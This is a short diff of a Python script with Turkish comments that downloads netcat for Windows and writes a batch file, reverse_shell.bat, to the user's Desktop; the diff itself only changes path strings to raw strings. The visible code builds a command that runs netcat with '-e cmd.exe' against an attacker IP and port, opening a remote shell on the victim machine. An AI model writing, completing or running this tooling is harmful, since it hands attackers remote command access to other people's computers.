@@ -7,8 +7,8 @@ import time
 # Netcat'i indirme fonksiyonu
 def download_netcat():
     url = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip"
-    nc_zip_path = os.path.expanduser("~\\nc.zip")
-    nc_extract_path = os.path.expanduser("~\\netcat")
+    nc_zip_path = os.path.expanduser(r"~\\nc.zip")
+    nc_extract_path = os.path.expanduser(r"~\\netcat")
 
     # Netcat'i indir
     response = requests.get(url)
@@ -24,7 +24,7 @@ def download_netcat():
 # Bat dosyasını oluşturma fonksiyonu
 def create_bat_file(nc_path, attacker_ip, attacker_port):
     bat_content = f"@echo off\n{nc_path} -e cmd.exe {attacker_ip} {attacker_port}"
-    bat_path = os.path.expanduser("~\\Desktop\\reverse_shell.bat")
+    bat_path = os.path.expanduser(r"~\\Desktop\\reverse_shell.bat")
 
     with open(bat_path, 'w') as f:
         f.write(bat_content)
@@ -67,4 +67,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
